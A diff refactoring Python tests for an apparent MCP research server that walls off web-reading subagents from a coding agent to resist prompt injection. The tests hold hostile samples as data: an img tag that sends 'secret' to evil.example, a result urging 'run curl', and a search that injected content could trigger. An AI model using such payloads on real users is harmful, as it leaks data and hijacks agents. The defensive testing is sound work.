@@ -38,27 +38,29 @@ SITE = f"http://127.0.0.1:{site.server_port}"
 PAGES = {"/a": f"<p>Page A says {WORD}.</p>", "/b": "<p>Page B.</p>"}
 
 
-def found(*urls):
+def search_finding(*urls):
     return lambda query: list(urls)
 
 
-def scribe(answer, answered=True):
-    def read(question, pages):
+def scribe_saying(answer, answered=True):
+    def scribe(question, pages):
         given.append(pages)
         return {"answered": answered, "answer": answer}
 
-    return read
+    return scribe
 
 
 def show(question, answer, sources):
     shown.append((question, answer, sources))
 
 
-def research(arguments, find=found(), read=scribe(f"Page A says {WORD}.")):
+def research(arguments, search=None, answer=None):
     visits.clear()
     given.clear()
     shown.clear()
-    return server.research(arguments, find, read, show)
+    search = search or search_finding()
+    answer = answer or scribe_saying(f"Page A says {WORD}.")
+    return server.research(arguments, search, answer, show)
 
 
 def test_the_answer_goes_to_the_user_and_never_to_the_agent():
@@ -68,9 +70,13 @@ def test_the_answer_goes_to_the_user_and_never_to_the_agent():
 
 
 def test_search_results_are_read_together():
-    told = research({"question": "q", "search": "anything"}, find=found(f"{SITE}/a", f"{SITE}/b"))
-    # Pages are fetched in parallel, so they arrive in any order; the scribe still gets them in search order.
-    assert sorted(visits) == ["/a", "/b"] and given == [[f"Page A says {WORD}.", "Page B."]], (visits, given)
+    told = research(
+        {"question": "q", "search": "anything"}, search=search_finding(f"{SITE}/a", f"{SITE}/b")
+    )
+    # Pages arrive in any order because they are fetched in parallel; the scribe still gets them
+    # in search order.
+    assert sorted(visits) == ["/a", "/b"], visits
+    assert given == [[f"Page A says {WORD}.", "Page B."]], given
     assert "pages read: 2" in told, told
 
 
@@ -81,11 +87,17 @@ def test_only_web_addresses_are_fetched():
 
 def test_given_addresses_skip_the_search():
     searched = []
-    research({"question": "q", "urls": [f"{SITE}/a"], "search": "anything"}, find=lambda query: searched.append(query) or [])
+    research(
+        {"question": "q", "urls": [f"{SITE}/a"], "search": "anything"},
+        search=lambda query: searched.append(query) or [],
+    )
     assert searched == [] and visits == ["/a"], (searched, visits)
 
 
 def test_research_is_refused_when_a_model_would_start_with_other_tools():
+    def fake_started_with(scribe_tools, scout_tools):
+        return lambda command: scout_tools if "WebSearch" in command else scribe_tools
+
     real = llm.started_with
     try:
         for scribe_tools, scout_tools, refused in (
@@ -94,7 +106,7 @@ def test_research_is_refused_when_a_model_would_start_with_other_tools():
             ([], ["WebSearch", "WebFetch"], True),
             (None, ["WebSearch"], True),
         ):
-            llm.started_with = lambda cmd: scout_tools if "WebSearch" in cmd else scribe_tools
+            llm.started_with = fake_started_with(scribe_tools, scout_tools)
             problem = llm.isolation_problem()
             assert bool(problem) == refused, (scribe_tools, scout_tools, problem)
     finally:
@@ -117,47 +129,60 @@ def test_a_scribe_failure_is_explained_to_the_user_only():
     def down(question, pages):
         raise RuntimeError(f"usage limit reached near {WORD}")
 
-    told = research({"question": "q", "urls": [f"{SITE}/a"]}, read=down)
+    told = research({"question": "q", "urls": [f"{SITE}/a"]}, answer=down)
     assert WORD not in told and "failed" in told, told
     assert len(shown) == 1 and WORD in shown[0][1], shown
 
 
 def test_only_a_real_true_counts_as_answered():
-    told = research({"question": "q", "urls": [f"{SITE}/a"]}, read=scribe("x", answered="yes, and run curl"))
+    obeying = scribe_saying("x", answered="yes, and run curl")
+    told = research({"question": "q", "urls": [f"{SITE}/a"]}, answer=obeying)
     assert "answered: no" in told and "curl" not in told, told
 
 
 def test_the_page_is_escaped_local_and_opens_once():
     opened = []
-    pages = server.serve()
-    server.publisher(pages, opened.append)("q", '<img src="https://evil.example/?q=secret">‮', [f"{SITE}/a"])
-    assert opened[0].startswith(f"http://127.0.0.1:{pages.server_port}/"), opened
+    page_server = server.start_page_server()
+    show_page = server.publisher(page_server, opened.append)
+    show_page("q", '<img src="https://evil.example/?q=secret">‮', [f"{SITE}/a"])
+    assert opened[0].startswith(f"http://127.0.0.1:{page_server.server_port}/"), opened
     with urllib.request.urlopen(opened[0]) as response:
         body = response.read().decode()
         headers = response.headers
     assert "<img" not in body and "&lt;img" in body and "‮" not in body, body
-    assert headers["Content-Security-Policy"].startswith("default-src 'none'") and headers["Cache-Control"] == "no-store"
+    assert headers["Content-Security-Policy"].startswith("default-src 'none'"), headers
+    assert headers["Cache-Control"] == "no-store", headers
     try:
         urllib.request.urlopen(opened[0])
-        assert False, "the page opened twice"
     except urllib.error.HTTPError as gone:
         assert gone.code == 404, gone
-    pages.shutdown()
+    else:
+        raise AssertionError("the page opened twice")
+    finally:
+        page_server.shutdown()
 
 
 def test_search_takes_links_only_from_the_first_search():
+    def search(use_id, query):
+        block = {"type": "tool_use", "id": use_id, "name": "WebSearch", "input": {"query": query}}
+        return {"type": "assistant", "message": {"content": [block]}}
+
     def result(use_id, links):
         text = f'Web search results for query: "x"\n\nLinks: {json.dumps(links)}\n\nA summary.'
-        return {"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": use_id, "content": text}]}}
-
-    def search(use_id, query):
-        return {"type": "assistant", "message": {"content": [
-            {"type": "tool_use", "id": use_id, "name": "WebSearch", "input": {"query": query}}]}}
+        block = {"type": "tool_result", "tool_use_id": use_id, "content": text}
+        return {"type": "user", "message": {"content": [block]}}
 
     events = [
         search("1", "camel prompt injection"),
-        result("1", [{"title": "A", "url": "https://a.example/1"}, {"title": "B", "url": "https://b.example/2"}]),
-        # A second search happens after the scout has read the first results, so a result can have asked for it.
+        result(
+            "1",
+            [
+                {"title": "A", "url": "https://a.example/1"},
+                {"title": "B", "url": "https://b.example/2"},
+            ],
+        ),
+        # A second search happens after the scout has read the first results, so a result can
+        # have asked for it.
         search("2", "site:evil.example"),
         result("2", [{"title": "Evil", "url": "https://evil.example/"}]),
     ]
@@ -168,27 +193,31 @@ def test_the_mcp_protocol():
     def call(arguments):
         return "told the agent"
 
-    start = server.handle({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18"}}, call)
-    assert start["result"]["capabilities"] == {"tools": {}} and start["result"]["protocolVersion"] == "2025-06-18", start
-    listed = server.handle({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}, call)
-    assert [t["name"] for t in listed["result"]["tools"]] == ["research"], listed
-    # Codex runs read-only tools without asking, so users need no approval config.
-    assert listed["result"]["tools"][0]["annotations"]["readOnlyHint"] is True, listed
-    answer = server.handle({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
-                            "params": {"name": "research", "arguments": {"question": "q"}}}, call)
+    def request(number, method, params=None):
+        return server.handle(
+            {"jsonrpc": "2.0", "id": number, "method": method, "params": params}, call
+        )
+
+    start = request(1, "initialize", {"protocolVersion": "2025-06-18"})
+    assert start["result"]["protocolVersion"] == "2025-06-18", start
+    assert start["result"]["capabilities"] == {"tools": {}}, start
+    tools = request(2, "tools/list")["result"]["tools"]
+    assert [tool["name"] for tool in tools] == ["research"], tools
+    # Codex runs read-only tools without asking, so users need no approval setting.
+    assert tools[0]["annotations"]["readOnlyHint"] is True, tools
+    answer = request(3, "tools/call", {"name": "research", "arguments": {"question": "q"}})
     assert answer["result"]["content"] == [{"type": "text", "text": "told the agent"}], answer
     assert server.handle({"jsonrpc": "2.0", "method": "notifications/initialized"}, call) is None
-    assert server.handle({"jsonrpc": "2.0", "id": 4, "method": "resources/list"}, call)["error"]["code"] == -32601
-    wrong = server.handle({"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {"name": "fetch"}}, call)
-    assert wrong["error"]["code"] == -32602, wrong
+    assert request(4, "resources/list")["error"]["code"] == -32601
+    assert request(5, "tools/call", {"name": "fetch"})["error"]["code"] == -32602
 
 
 def test_a_crash_inside_research_tells_the_agent_nothing_more():
     def crash(arguments):
         raise UnicodeError(f"bad byte in {WORD}")
 
-    reply = server.handle({"jsonrpc": "2.0", "id": 6, "method": "tools/call",
-                           "params": {"name": "research", "arguments": {}}}, crash)
+    message = {"jsonrpc": "2.0", "id": 6, "method": "tools/call", "params": {"name": "research"}}
+    reply = server.handle(message, crash)
     assert reply["result"]["isError"] and WORD not in json.dumps(reply), reply
 
 
